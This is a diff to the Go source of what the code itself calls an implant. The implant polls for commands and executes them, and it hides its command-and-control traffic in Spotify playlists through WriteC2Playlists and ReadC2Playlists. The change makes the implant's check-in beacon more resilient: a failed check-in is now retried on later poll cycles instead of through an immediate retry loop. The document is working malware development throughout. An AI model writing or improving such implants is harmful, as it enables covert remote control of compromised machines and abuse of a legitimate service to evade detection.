@@ -18,11 +18,12 @@ import (
 
 // Implant polls for commands and executes them.
 type Implant struct {
-	client        *spotify.Client
-	key           string
-	interval      int
-	jitter        int
-	processedSeqs map[int]bool
+	client         *spotify.Client
+	key            string
+	interval       int
+	jitter         int
+	processedSeqs  map[int]bool
+	checkinPending bool
 }
 
 // NewImplant creates a new implant.
@@ -85,21 +86,15 @@ func (imp *Implant) sendCheckin() {
 		return
 	}
 
-	for attempt := 1; attempt <= 3; attempt++ {
-		err = imp.client.WriteC2Playlists(ctx, chunks)
-		if err == nil {
-			fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
-			return
-		}
-		if isRateLimit(err) {
-			wait := time.Duration(attempt*10) * time.Second
-			fmt.Printf("[*] Rate limited, retrying in %s...\n", wait)
-			time.Sleep(wait)
-			continue
-		}
-		fmt.Printf("[!] Checkin send failed: %v\n", err)
+	err = imp.client.WriteC2Playlists(ctx, chunks)
+	if err != nil {
+		fmt.Printf("[!] Checkin failed: %v\n", err)
+		fmt.Println("[*] Will retry checkin on next poll cycle")
+		imp.checkinPending = true
 		return
 	}
+	fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
+	imp.checkinPending = false
 }
 
 // isRateLimit checks if an error is a Spotify rate limit.
@@ -128,6 +123,11 @@ func (imp *Implant) Run() {
 
 func (imp *Implant) pollAndExecute() {
 	ctx := context.Background()
+
+	// Retry checkin if it failed earlier
+	if imp.checkinPending {
+		imp.sendCheckin()
+	}
 
 	seqGroups, err := imp.client.ReadC2Playlists(ctx,
 		protocol.ChannelCmd, imp.key, -1)
